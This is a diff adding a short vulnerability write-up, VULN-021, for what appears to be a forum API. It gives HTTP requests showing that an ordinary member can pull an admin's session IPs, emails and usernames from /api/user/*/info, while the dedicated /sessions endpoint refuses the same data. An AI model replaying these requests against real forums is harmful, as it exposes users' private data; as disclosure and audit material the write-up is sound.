@@ -1,0 +1,21 @@
+### VULN-021 — /info over-exposure vs /sessions (config-gated)
+
+### Precondition (admin): delegate the global privilege to a lower group:
+PUT /api/v3/categories/0/privileges/groups:view:users:info   {"member":"registered-users"}
+
+### Exploit (as an ordinary member holding only view:users:info):
+GET /api/user/admin/info HTTP/1.1
+Host: localhost:21372
+Cookie: express.sid=<member sid>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0.0.0 Safari/537.36
+# -> 200; JSON includes:
+#    "sessions":[{"ip":"172.18.0.1","uuid":"...","platform":"Linux","browser":"Chrome","version":"124.0.0.0","datetime":...}, ...]
+#    "emails":[{"value":"admin@example.com", ...}]
+#    "usernames":[{"value":"admin", ...}]
+#    "invitedBy": ...
+
+### Control — the dedicated endpoint for the SAME session data requires canEdit:
+GET /api/user/admin/sessions HTTP/1.1
+Host: localhost:21372
+Cookie: express.sid=<member sid>
+# -> 403 Forbidden   (authorization divergence: /info is a weaker gate for the same data)
